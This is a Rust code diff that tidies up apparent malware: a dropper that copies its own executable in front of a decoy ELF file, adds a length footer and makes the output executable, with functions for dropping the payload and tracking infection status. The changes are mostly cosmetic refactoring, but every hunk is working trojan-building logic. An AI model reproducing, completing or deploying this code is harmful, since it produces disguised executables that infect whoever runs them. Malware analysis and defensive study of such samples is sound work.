@@ -20,27 +20,25 @@ pub enum InfectionStatus {
 }
 
 pub fn create_dropper() -> Result<(), Box<dyn std::error::Error>> {
-    {
-        let args = Args::parse();
+    let args = Args::parse();
 
-        let decoy_path = &args.decoy_path;
-        let output_path = &args.output_path;
-        assert!(is_elf(decoy_path));
+    let decoy_path = &args.decoy_path;
+    let output_path = &args.output_path;
+    assert!(is_elf(decoy_path));
 
-        let mut destination_file = File::create(output_path)?;
+    let mut destination_file = File::create(output_path)?;
 
-        let own_path = current_exe()?;
-        let mut own_contents: Vec<u8> = read(own_path)?;
-        set_dropper_tag(&mut own_contents);
+    let own_path = current_exe()?;
+    let mut own_contents: Vec<u8> = read(own_path)?;
+    set_dropper_tag(&mut own_contents);
 
-        let payload_length: [u8; 8] = own_contents.len().to_le_bytes();
-        let decoy_contents: Vec<u8> = read(decoy_path)?;
+    let payload_length: [u8; 8] = own_contents.len().to_le_bytes();
+    let decoy_contents: Vec<u8> = read(decoy_path)?;
 
-        destination_file.write_all(&own_contents)?;
-        destination_file.write_all(&decoy_contents)?;
-        destination_file.write_all(&payload_length)?;
-        destination_file.set_permissions(PermissionsExt::from_mode(0o755))?;
-    }
+    destination_file.write_all(&own_contents)?;
+    destination_file.write_all(&decoy_contents)?;
+    destination_file.write_all(&payload_length)?;
+    destination_file.set_permissions(PermissionsExt::from_mode(0o755))?;
 
     Ok(())
 }
@@ -62,7 +60,7 @@ pub fn drop_payload() -> Result<(), Box<dyn std::error::Error>> {
 
     let decoy_contents: Vec<u8> = read(decoy_path)?;
 
-    destination_file.write_all(&own_contents_truncated)?;
+    destination_file.write_all(own_contents_truncated)?;
     destination_file.write_all(&decoy_contents)?;
     destination_file.write_all(&payload_length_bytes)?;
     destination_file.set_permissions(PermissionsExt::from_mode(0o755))?;
@@ -111,13 +109,9 @@ pub fn get_own_infection_status() -> InfectionStatus {
 
 fn is_tag_in_file_buffer(tag: &[u8], file_buffer: &[u8]) -> bool {
     let tag_len = tag.len();
-    match file_buffer
+    file_buffer
         .windows(tag_len)
-        .position(|window| window == tag)
-    {
-        Some(_) => true,
-        None => false,
-    }
+        .any(|window| window == tag)
 }
 
 fn make_first_letter_uppercase(lower_string: &str) -> String {
@@ -153,6 +147,8 @@ fn set_dropper_tag(file_contents: &mut [u8]) {
         .position(|window| window == tag_bytes)
     {
         file_contents[tag_index] ^= 0x20;
+    } else {
+        panic!("Could not find tag in myself!");
     }
 }
 
@@ -161,7 +157,7 @@ fn is_elf(file_path: &str) -> bool {
     let mut magic_number = [0; 4];
 
     let mut suspect_file = File::open(file_path).expect("Failed to open file when scanning.");
-    suspect_file
+    let _ = suspect_file
         .read(&mut magic_number)
         .expect("Failed to read file");
 
